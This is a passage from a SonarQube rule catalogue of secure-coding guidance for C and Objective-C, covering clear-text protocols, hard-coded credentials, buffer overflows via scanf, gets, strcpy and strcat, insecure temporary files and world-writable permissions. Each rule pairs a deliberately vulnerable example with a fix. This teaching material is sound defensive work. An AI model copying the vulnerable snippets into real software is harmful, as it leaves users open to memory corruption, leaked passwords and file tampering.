  <li> <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-12327">CVE-2019-12327</a> </li>
  <li> <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-11065">CVE-2019-11065</a> </li>
</ul>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> Application data needs to be protected against falsifications or leaks when transiting over the network. </li>
  <li> Application data transits over an untrusted network. </li>
  <li> Compliance rules require the service to encrypt data in transit. </li>
  <li> Your application renders web pages with a relaxed mixed content policy. </li>
  <li> OS-level protections against clear-text traffic are deactivated. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Make application data transit over a secure, authenticated and encrypted protocol like TLS or SSH. Here are a few alternatives to the most
  common clear-text protocols:
    <ul>
      <li> Use <code>ssh</code> as an alternative to <code>telnet</code>. </li>
      <li> Use <code>sftp</code>, <code>scp</code>, or <code>ftps</code> instead of <code>ftp</code>. </li>
      <li> Use <code>https</code> instead of <code>http</code>. </li>
      <li> Use <code>SMTP</code> over <code>SSL/TLS</code> or <code>SMTP</code> with <code>STARTTLS</code> instead of clear-text SMTP. </li>
    </ul>  </li>
  <li> Enable encryption of cloud components communications whenever it is possible. </li>
  <li> Configure your application to block mixed content when rendering web pages. </li>
  <li> If available, enforce OS-level deactivation of all clear-text traffic. </li>
</ul>
<p>It is recommended to secure all transport channels, even on local networks, as it can take a single non-secure connection to compromise an entire
application or system.</p>
<h2>Sensitive Code Example</h2>
<pre>
char* http_url = "http://example.com"; // Sensitive
char* ftp_url = "ftp://anonymous@example.com"; // Sensitive
char* telnet_url = "telnet://anonymous@example.com"; // Sensitive
</pre>
<pre>
#include &lt;curl/curl.h&gt;

CURL *curl_ftp = curl_easy_init();
curl_easy_setopt(curl_ftp, CURLOPT_URL, "ftp://example.com/"); // Sensitive

CURL *curl_smtp = curl_easy_init();
curl_easy_setopt(curl_smtp, CURLOPT_URL, "smtp://example.com:587"); // Sensitive
</pre>
<h2>Compliant Solution</h2>
<pre>
char* https_url = "https://example.com";
char* sftp_url = "sftp://anonymous@example.com";
char* ssh_url = "ssh://anonymous@example.com";
</pre>
<pre>
#include &lt;curl/curl.h&gt;

CURL *curl_ftps = curl_easy_init();
curl_easy_setopt(curl_ftps, CURLOPT_URL, "ftp://example.com/");
curl_easy_setopt(curl_ftps, CURLOPT_USE_SSL, CURLUSESSL_ALL); // FTP transport is done over TLS

CURL *curl_smtp_tls = curl_easy_init();
curl_easy_setopt(curl_smtp_tls, CURLOPT_URL, "smtp://example.com:587");
curl_easy_setopt(curl_smtp_tls, CURLOPT_USE_SSL, CURLUSESSL_ALL); // SMTP with STARTTLS
</pre>
<h2>Exceptions</h2>
<p>No issue is reported for the following cases because they are not considered sensitive:</p>
<ul>
  <li> Insecure protocol scheme followed by loopback addresses like 127.0.0.1 or <code>localhost</code>. </li>
</ul>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data Exposure
  </a> </li>
  <li> OWASP - <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x10-v5-network_communication_requirements">Mobile AppSec
  Verification Standard - Network Communication Requirements</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m3-insecure-communication">Mobile Top 10 2016 Category M3 - Insecure
  Communication</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/200">CWE-200 - Exposure of Sensitive Information to an Unauthorized Actor</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/319">CWE-319 - Cleartext Transmission of Sensitive Information</a> </li>
  <li> <a href="https://security.googleblog.com/2016/09/moving-towards-more-secure-web.html">Google, Moving towards more secure web</a> </li>
  <li> <a href="https://blog.mozilla.org/security/2015/04/30/deprecating-non-secure-http/">Mozilla, Deprecating non secure http</a> </li>
  <li> <a href="https://docs.aws.amazon.com/elasticloadbalancing/latest/application/load-balancer-listeners.html">AWS Documentation</a> - Listeners
  for your Application Load Balancers </li>
  <li> <a href="https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-properties-kinesis-stream-streamencryption.html">AWS
  Documentation</a> - Stream Encryption </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=objc:S2068">
              objc:S2068
            </a>
          </td>
          <td>
            <details>
              <p>Because it is easy to extract strings from an application source code or binary, credentials should not be hard-coded. This is particularly true
for applications that are distributed or that are open-source.</p>
<p>In the past, it has led to the following vulnerabilities:</p>
<ul>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-13466">CVE-2019-13466</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-15389">CVE-2018-15389</a> </li>
</ul>
<p>Credentials should be stored outside of the code in a configuration file, a database, or a management service for secrets.</p>
<p>This rule looks for hard-coded credentials in variable names that match any of the patterns from the provided list.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> Credentials allow access to a sensitive component like a database, a file storage, an API or a service. </li>
  <li> Credentials are used in production environments. </li>
  <li> Application re-distribution is required before updating the credentials. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Store the credentials in a configuration file that is not pushed to the code repository. </li>
  <li> Store the credentials in a database. </li>
  <li> Use your cloud provider’s service for managing secrets. </li>
  <li> If a password has been disclosed through the source code: change it. </li>
</ul>
<h2>Sensitive Code Example</h2>
<pre>
dbi_conn conn = dbi_conn_new("mysql");
string password = "secret"; // Sensitive
dbi_conn_set_option(conn, "password", password.c_str());
</pre>
<h2>Compliant Solution</h2>
<pre>
dbi_conn conn = dbi_conn_new("mysql");
string password = getDatabasePassword(); // Compliant
dbi_conn_set_option(conn, "password", password.c_str()); // Compliant
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/">Top 10 2021 Category A7 - Identification and
  Authentication Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication">Top 10 2017 Category A2 - Broken Authentication</a>
  </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/798">CWE-798 - Use of Hard-coded Credentials</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/259">CWE-259 - Use of Hard-coded Password</a> </li>
  <li> Derived from FindSecBugs rule <a href="https://h3xstream.github.io/find-sec-bugs/bugs.htm#HARD_CODE_PASSWORD">Hard Coded Password</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=objc:S5798">
              objc:S5798
            </a>
          </td>
          <td>
            <details>
              <p>If a buffer contains sensitive data, such as passwords or access tokens, it is good practice to overwrite the buffer before releasing the memory.
This ensures that the sensitive data is not available when that memory is reallocated. The <code>memset</code> function is commonly used for this
purpose.</p>
<h2>Why is this an issue?</h2>
<p>The C language specification allows the compiler to remove unnecessary code during the optimization phase. For example, when a memory buffer is
about to be destroyed, any writes to that buffer may be seen as unnecessary to the operation of the program. The compiler may choose to remove these
write operations.</p>
<p>When the <code>memset</code> function is used to clear sensitive data from memory and that memory is destroyed immediately afterward, the compiler
may see the <code>memset</code> call as unnecessary and remove it. The sensitive data will, therefore, remain in memory.</p>
<p>This rule raises an issue when a call to <code>memset</code> is followed by the destruction of the buffer.</p>
<h2>How to fix it</h2>
<p>The function <a href="https://en.cppreference.com/w/c/string/byte/memset"><code>memset_s</code></a> behaves similarly to <code>memset</code>. The
main difference is that it cannot be optimized away and the memory will be overwritten in all cases. You should use <code>memset_s</code> to clear
security-sensitive data.</p>
<p>The <code>memset_s</code> function is defined in annex K of C11 and is optional for C11 compilers. It will only be available if the macro
<code>__STDC_LIB_EXT1__</code> is defined, and it must be enabled by defining the macro <code>__STDC_WANT_LIB_EXT1__</code> before including
<code>&lt;string.h&gt;</code>.</p>
<p>Other platform-specific functions can perform the same operation, such as <a
href="https://docs.microsoft.com/en-us/previous-versions/windows/desktop/legacy/aa366877(v=vs.85)?redirectedfrom=MSDN">SecureZeroMemory</a> (Windows)
or <a href="https://www.freebsd.org/cgi/man.cgi?query=explicit_bzero">explicit_bzero</a> (FreeBSD).</p>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
#include &lt;string&gt;

void f(char *password, size_t bufferSize) {
  char localToken[256];
  init(localToken, password);
  memset(password, 0, strlen(password));  // Noncompliant
  memset(localToken, 0, strlen(localToken));  // Noncompliant
  free(password);
}
</pre>
<p>The <code>memset</code> calls may be optimized away because <code>password</code> is about to be freed and <code>localToken</code> is about to go
out of scope.</p>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
#define __STDC_WANT_LIB_EXT1__
#include &lt;string&gt;

void f(char *password, size_t bufferSize) {
  char localToken[256];
  init(localToken, password);
  memset_s(password, bufferSize, 0, strlen(password));
  memset_s(localToken, sizeof(localToken), 0, strlen(localToken));
  free(password);
}
</pre>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul>
  <li> C++ reference - <a href="https://en.cppreference.com/w/c/string/byte/memset"><code>memset</code>, <code>memset_s</code></a> </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> OWASP - <a href="https://github.com/OWASP/ASVS/blob/master/4.0/en/0x16-V8-Data-Protection.md#v83-sensitive-private-data">Application Security
  Verification Standard 4.0 - 8.3.6</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/14">CWE-14 - Compiler Removal of Code to Clear Buffers</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=objc:S1079">
              objc:S1079
            </a>
          </td>
          <td>
            <details>
              <p>The <code>%s</code> format specifier is used to read a string into a buffer. If the input string exceeds the size of this buffer, a buffer overflow
can occur.</p>
<h2>Why is this an issue?</h2>
<p>By default, there is no limit on the length of the string being read. The <code>scanf</code> family of functions will continue to read characters
into the buffer until they encounter a whitespace character.</p>
<p>If the input contains a string that is long enough and lacks whitespace characters, it can result in memory beyond the end of the buffer being
overwritten. This situation is known as a buffer overflow vulnerability.</p>
<h3>What is the potential impact?</h3>
<p>An attacker could exploit this vulnerability to overwrite memory used by the application. This could result in the modification of application
data, unexpected behavior, or even cause the application to become unstable or crash. In some cases, the attacker might also gain control over the
execution flow of the application, leading to arbitrary code execution.</p>
<h2>How to fix it</h2>
<p>A field width can be used together with the <code>%s</code> format specifier. This places an upper limit on the number of characters that will be
read into the buffer.</p>
<p>Note that the <code>%s</code> format specifier always null-terminates the string in the buffer. You will need to ensure that the buffer is large
enough to hold the required input and the null terminator.</p>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
char buffer[10];
scanf("%s", buffer);  // Noncompliant
</pre>
<p>If this code is given the word <code>noncompliant</code> as an input, <code>noncomplia</code> will be stored in <code>buffer</code> and
<code>nt␀</code> will overwrite the contents of the memory immediately following <code>buffer</code>.</p>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
char buffer[10];
scanf("%9s", buffer);
</pre>
<p>If this code is given the word <code>noncompliant</code> as an input, <code>noncompli␀</code> will be stored in <code>buffer</code>.</p>
<h2>Resources</h2>
<h3>Articles &amp; blog posts</h3>
<ul>
  <li> Wikipedia - <a href="https://en.wikipedia.org/wiki/Buffer_overflow">Buffer overflow</a> </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A9_2017-Using_Components_with_Known_Vulnerabilities">Top 10 2017 Category A9 -
  Using Components with Known Vulnerabilities</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/120">CWE-120 - Buffer Copy without Checking Size of Input</a> ('Classic Buffer Overflow')
  </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/676">CWE-676 - Use of Potentially Dangerous Function</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=objc:S5443">
              objc:S5443
            </a>
          </td>
          <td>
            <details>
              <p>Operating systems have global directories where any user has write access. Those folders are mostly used as temporary storage areas like
<code>/tmp</code> in Linux based systems. An application manipulating files from these folders is exposed to race conditions on filenames: a malicious
user can try to create a file with a predictable name before the application does. A successful attack can result in other files being accessed,
modified, corrupted or deleted. This risk is even higher if the application runs with elevated permissions.</p>
<p>In the past, it has led to the following vulnerabilities:</p>
<ul>
  <li> <a href="https://nvd.nist.gov/vuln/detail/CVE-2012-2451">CVE-2012-2451</a> </li>
  <li> <a href="https://nvd.nist.gov/vuln/detail/CVE-2015-1838">CVE-2015-1838</a> </li>
</ul>
<p>This rule raises an issue whenever it detects a hard-coded path to a publicly writable directory like <code>/tmp</code> (see examples bellow). It
also detects access to environment variables that point to publicly writable directories, e.g., <code>TMP</code> and <code>TMPDIR</code>.</p>
<ul>
  <li> <code>/tmp</code> </li>
  <li> <code>/var/tmp</code> </li>
  <li> <code>/usr/tmp</code> </li>
  <li> <code>/dev/shm</code> </li>
  <li> <code>/dev/mqueue</code> </li>
  <li> <code>/run/lock</code> </li>
  <li> <code>/var/run/lock</code> </li>
  <li> <code>/Library/Caches</code> </li>
  <li> <code>/Users/Shared</code> </li>
  <li> <code>/private/tmp</code> </li>
  <li> <code>/private/var/tmp</code> </li>
  <li> <code>\Windows\Temp</code> </li>
  <li> <code>\Temp</code> </li>
  <li> <code>\TMP</code> </li>
</ul>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> Files are read from or written into a publicly writable folder </li>
  <li> The application creates files with predictable names into a publicly writable folder </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Use a dedicated sub-folder with tightly controlled permissions </li>
  <li> Use secure-by-design APIs to create temporary files. Such API will make sure:
    <ul>
      <li> The generated filename is unpredictable </li>
      <li> The file is readable and writable only by the creating user ID </li>
      <li> The file descriptor is not inherited by child processes </li>
      <li> The file will be destroyed as soon as it is closed </li>
    </ul>  </li>
</ul>
<h2>Sensitive Code Example</h2>
<pre>
#include &lt;cstdio&gt;
// ...

void f() {
  FILE * fp = fopen("/tmp/temporary_file", "r"); // Sensitive
}
</pre>
<pre>
#include &lt;cstdio&gt;
#include &lt;cstdlib&gt;
#include &lt;sstream&gt;
// ...

void f() {
  std::stringstream ss;
  ss &lt;&lt; getenv("TMPDIR") &lt;&lt; "/temporary_file"; // Sensitive
  FILE * fp = fopen(ss.str().c_str(), "w");
}
</pre>
<h2>Compliant Solution</h2>
<pre>
#include &lt;cstdio&gt;
#include &lt;cstdlib&gt;
// ...

void f() {
  FILE * fp = tmpfile(); // Compliant
}
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/">Top 10 2021 Category A1 - Broken Access Control</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control">Top 10 2017 Category A5 - Broken Access Control</a>
  </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/377">CWE-377 - Insecure Temporary File</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/379">CWE-379 - Creation of Temporary File in Directory with Incorrect Permissions</a>
  </li>
  <li> <a href="https://owasp.org/www-community/vulnerabilities/Insecure_Temporary_File">OWASP, Insecure Temporary File</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=objc:S2612">
              objc:S2612
            </a>
          </td>
          <td>
            <details>
              <p>In Unix file system permissions, the "<code>others</code>" category refers to all users except the owner of the file system resource and the
members of the group assigned to this resource.</p>
<p>Granting permissions to this category can lead to unintended access to files or directories that could allow attackers to obtain sensitive
information, disrupt services or elevate privileges.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The application is designed to be run on a multi-user environment. </li>
  <li> Corresponding files and directories may contain confidential information. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>The most restrictive possible permissions should be assigned to files and directories.</p>
<h2>Sensitive Code Example</h2>
<p>When creating a file or directory with permissions to "other group":</p>
<pre>
open("myfile.txt", O_CREAT, S_IRWXU | S_IRWXG | S_IRWXO); // Sensitive: the process set 777 permissions to this newly created file

mkdir("myfolder", S_IRWXU | S_IRWXG | S_IRWXO); // Sensitive: the process try to set 777 permissions to this newly created directory
</pre>
<p>When explicitly adding permissions to "other group" with <code>chmod</code>, <code>fchmod</code> or <code>filesystem::permissions</code>
functions:</p>
<pre>
chmod("myfile.txt", S_IRWXU | S_IRWXG | S_IRWXO);  // Sensitive: the process set 777 permissions to this file

fchmod(fd, S_IRWXU | S_IRWXG | S_IRWXO); // Sensitive: the process set 777 permissions to this file descriptor
</pre>
<p>When defining the <code>umask</code> without read, write and execute permissions for "other group":</p>
<pre>
umask(S_IRWXU | S_IRWXG); // Sensitive: the further files and folders will be created with possible permissions to "other group"
</pre>
<h2>Compliant Solution</h2>
<p>When creating a file or directory, do not set permissions to "other group":</p>
<pre>
open("myfile.txt", O_CREAT, S_IRWXU | S_IRWXG); // Compliant

mkdir("myfolder", S_IRWXU | S_IRWXG); // Compliant
</pre>
<p>When using <code>chmod</code>, <code>fchmod</code> or <code>filesystem::permissions</code> functions, do not add permissions to "other group":</p>
<pre>
chmod("myfile.txt", S_IRWXU | S_IRWXG);  // Compliant

fchmod(fd, S_IRWXU | S_IRWXG); // Compliant
</pre>
<p>When defining the <code>umask</code>, set read, write and execute permissions to other group:</p>
<pre>
umask(S_IRWXO); // Compliant: further created files or directories will not have permissions set for "other group"
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/">Top 10 2021 Category A1 - Broken Access Control</a> </li>
  <li> OWASP - <a href="https://owasp.org/Top10/A04_2021-Insecure_Design/">Top 10 2021 Category A4 - Insecure Design</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control">Top 10 2017 Category A5 - Broken Access Control</a>
  </li>
  <li> <a
  href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/09-Test_File_Permission">OWASP File Permission</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/732">CWE-732 - Incorrect Permission Assignment for Critical Resource</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/266">CWE-266 - Incorrect Privilege Assignment</a> </li>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/display/c/FIO06-C.+Create+files+with+appropriate+access+permissions">CERT, FIO06-C.</a> - Create
  files with appropriate access permissions </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=objc:S1081">
              objc:S1081
            </a>
          </td>
          <td>
            <details>
              <p>Insecure functions often involve handling data, such as strings and memory operations. The vulnerability arises when these functions do not
properly check or limit the size of the data they are handling.</p>
<h2>Why is this an issue?</h2>
<p>An attacker typically provides input that exceeds the expected size. This could be through a text field in a user interface, a file that the
program reads, or data sent over a network. The insecure function processes this input and places the result into a provided buffer.</p>
<p>If the input is larger than the buffer can handle, the insecure function will overwrite the memory following the buffer. This situation is known as
a buffer overflow vulnerability.</p>
<p>When using typical C or C++ functions, it’s up to the developer to make sure the size of the buffer to be written to is large enough to avoid
buffer overflows.</p>
<h3>What is the potential impact?</h3>
<h4>Code execution</h4>
<p>In some cases, an attacker can craft input in a way that allows them to gain unauthorized access to your system. For example, they might be able to
overwrite a function’s return address in memory, causing your program to execute code of the attacker’s choosing. This could potentially give the
attacker full control over your system.</p>
<h4>Denial of service</h4>
<p>If an attacker can trigger a buffer overflow by providing oversized input, it can cause the program to crash. If the attacker repeats this process,
it can continually disrupt the service, denying access to other users. This can be particularly damaging for services that require high availability,
such as online platforms or databases.</p>
<p>In some cases, the input might cause the program to enter an infinite loop or consume excessive memory, slowing down the system or even causing it
to become unresponsive. This type of attack is known as a resource exhaustion DoS attack.</p>
<h2>How to fix it</h2>
<p>Insecure functions should be replaced with safer alternatives that limit how much data can be written to the buffer.</p>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
#include &lt;stdio.h&gt;

char str[20];
gets(str); // Noncompliant; `str` buffer size is not checked and it is vulnerable to overflows
</pre>
<pre data-diff-id="2" data-diff-type="noncompliant">
#include &lt;string.h&gt;

char buffer[20];
strcpy(buffer, input); // Noncompliant; `input` length is not checked and it may overflow `buffer`
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
#define __STDC_WANT_LIB_EXT1__
#include &lt;stdio.h&gt;

char str[20];
gets_s(str, sizeof(str));
</pre>
<pre data-diff-id="2" data-diff-type="compliant">
#define __STDC_WANT_LIB_EXT1__
#include &lt;string.h&gt;

char buffer[20];
strcpy_s(buffer, sizeof buffer, input);
</pre>
<h3>How does this work?</h3>
<p>C and C++ have a number of functions that are considered insecure because they do not perform bounds checking. Functions like <code>gets</code> are
known to be risky. Replace these with safer alternatives that include bounds checking. For example, instead of <code>gets</code>, use
<code>gets_s</code>.</p>
<p>The code can also checks if the size of input data is less than or equal to the size of a buffer (including the terminating null byte when dealing
with strings).</p>
<p>The <code>gets_s</code> function is defined in annex K of C11 and is optional for C11 compilers. It will only be available if the macro
<code>__STDC_LIB_EXT1__</code> is defined, and it must be enabled by defining the macro <code>__STDC_WANT_LIB_EXT1__</code> before including
<code>&lt;stdio.h&gt;</code>.</p>
<p>Other platform-specific functions can perform the same operations. For example, <code>strcpy</code> can be substituted with <a
href="https://learn.microsoft.com/en-us/windows/win32/api/strsafe/nf-strsafe-stringcbcopya">StringCbCopyA</a> (Windows) or <a
href="https://www.freebsd.org/cgi/man.cgi?query=strlcpy">strlcpy</a> (FreeBSD).</p>
<h2>Resources</h2>
<h3>Articles &amp; blog posts</h3>
<ul>
  <li> Wikipedia - <a href="https://en.wikipedia.org/wiki/Buffer_overflow">Buffer overflow</a> </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/">Top 10 2021 - A06 - Vulnerable and Outdated
  Components</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A9_2017-Using_Components_with_Known_Vulnerabilities">Top 10 2017 Category A9 -
  Using Components with Known Vulnerabilities</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/676">CWE-676 - Use of Potentially Dangerous Function</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/119">CWE-119 - Improper Restriction of Operations within the Bounds of a Memory
  Buffer</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=objc:S5814">
              objc:S5814
            </a>
          </td>
          <td>
            <details>
              <p>In C, a string is just a buffer of characters, normally using the <code>null</code> character as a sentinel for the end of the string. This means
that the developer has to be aware of low-level details such as buffer sizes or having an extra character to store the final <code>null</code>
character. Doing that correctly and consistently is notoriously difficult and any error can lead to a security vulnerability, for instance, giving
access to sensitive data or allowing arbitrary code execution.</p>
<p>The function <code>char *strcat( char *restrict dest, const char *restrict src );</code> appends the characters of string <code>src</code> at the
end of <code>dest</code>. The <code>wcscat</code> does the same for wide characters and should be used with the same guidelines.</p>
<p>Note: the functions <code>strncat</code> and <code>wcsncat</code> might look like attractive safe replacements for <code>strcat</code> and
<code>wcscaty</code>, but they have their own set of issues (see <a href='/organizations/sopra-steria/rules?open=objc%3AS5815&rule_key=objc%3AS5815'>S5815</a>), and you should probably prefer another more adapted
alternative.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> There is a possibility that either the <code>src</code> or the <code>dest</code> pointer is <code>null</code> </li>
  <li> The current string length of <code>dest</code> plus the current string length of <code>src</code> plus 1 (for the final&nbsp;<code>null</code>
  character) is larger than the size of the buffer pointer-to by <code>src</code> </li>
  <li> There is a possibility that either string is not correctly <code>null</code>-terminated </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> C11 provides, in its annex K, the <code>strcat_s</code> and the <code>wcscat_s</code> that were designed as safer alternatives to
  <code>strcat</code> and <code>wcscat</code>. It’s not recommended to use them in all circumstances, because they introduce a runtime overhead and
  require to write more code for error handling, but they perform checks that will limit the consequences of calling the function with bad arguments.
  </li>
  <li> Even if your compiler does not exactly support annex K, you probably have access to similar functions </li>
  <li> If you are writing C++ code, using <code>std::string</code> to manipulate strings is much simpler and less error-prone </li>
</ul>
<h2>Sensitive Code Example</h2>
<pre>
int f(char *src) {
  char dest[256];
  strcpy(dest, "Result: ");
  strcat(dest, src); // Sensitive: might overflow
  return doSomethingWith(dest);
}
</pre>
<h2>Compliant Solution</h2>
<pre>
int f(char *src) {
  char result[] = "Result: ";
  char *dest = malloc(sizeof(result) + strlen(src)); // Not need of +1 for final 0 because sizeof will already count one 0
  strcpy(dest, result);
  strcat(dest, src); // Compliant: the buffer size was carefully crafted
  int r = doSomethingWith(dest);
  free(dest);
  return r;
}
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/">Top 10 2021 Category A6 - Vulnerable and Outdated
  Components</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A9_2017-Using_Components_with_Known_Vulnerabilities">Top 10 2017 Category A9 -
  Using Components with Known Vulnerabilities</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/120">CWE-120 - Buffer Copy without Checking Size of Input ('Classic Buffer Overflow')</a>
  </li>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/HdcxBQ">CERT, STR07-C.</a> - Use the bounds-checking interfaces for string manipulation </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=objc:S5813">
              objc:S5813
            </a>
          </td>
          <td>
            <details>
              <p>The function <code>size_t strlen(const char *s)</code> measures the length of the string <code>s</code> (excluding the final null character).<br>
The function <code>size_t wcslen(const wchar_t *s)</code> does the same for wide characters, and should be used with the same guidelines.</p>
<p>Similarly to many other functions in the standard C libraries, <code>strlen</code> and <code>wcslen</code> assume that their argument is not a null
pointer.</p>
<p>Additionally, they expect the strings to be null-terminated. For example, the 5-letter string "abcde" must be stored in memory as "abcde\0" (i.e.
using 6 characters) to be processed correctly. When a string is missing the null character at the end, these functions will iterate past the end of
the buffer, which is undefined behavior.</p>
<p>Therefore, string parameters must end with a proper null character. The absence of this particular character can lead to security vulnerabilities
that allow, for example, access to sensitive data or the execution of arbitrary code.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> There is a possibility that the pointer is null. </li>
  <li> There is a possibility that the string is not correctly null-terminated. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Use safer functions. The C11 functions <code>strlen_s</code> and <code>wcslen_s</code> from annex K handle typical programming errors.<br>
  Note, however, that they have a runtime overhead and require more code for error handling and therefore are not suited to every case. </li>
  <li> Even if your compiler does not exactly support annex K, you probably have access to similar functions. </li>
  <li> If you are writing C++ code, using <code>std::string</code> to manipulate strings is much simpler and less error-prone. </li>
</ul>
<h2>Sensitive Code Example</h2>
<pre>
size_t f(char *src) {
  char dest[256];
  strncpy(dest, src, sizeof dest); // Truncation may happen
  return strlen(dest); // Sensitive: "dest" will not be null-terminated if truncation happened
}
</pre>
<h2>Compliant Solution</h2>
<pre>
size_t f(char *src) {
  char dest[256];
  strncpy(dest, src, sizeof dest); // Truncation may happen
  dest[sizeof dest - 1] = 0;
  return strlen(dest); // Compliant: "dest" is guaranteed to be null-terminated
}
</pre>
<h2>See</h2>
<ul>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/120">CWE-120 - Buffer Copy without Checking Size of Input ('Classic Buffer Overflow')</a>
  </li>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/HdcxBQ">CERT, STR07-C.</a> - Use the bounds-checking interfaces for string manipulation </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=objc:S5816">
              objc:S5816
            </a>
          </td>
          <td>
            <details>
              <p>In C, a string is just a buffer of characters, normally using the <code>null</code> character as a sentinel for the end of the string. This means
that the developer has to be aware of low-level details such as buffer sizes or having an extra character to store the final <code>null</code>
character. Doing that correctly and consistently is notoriously difficult and any error can lead to a security vulnerability, for instance, giving
access to sensitive data or allowing arbitrary code execution.</p>
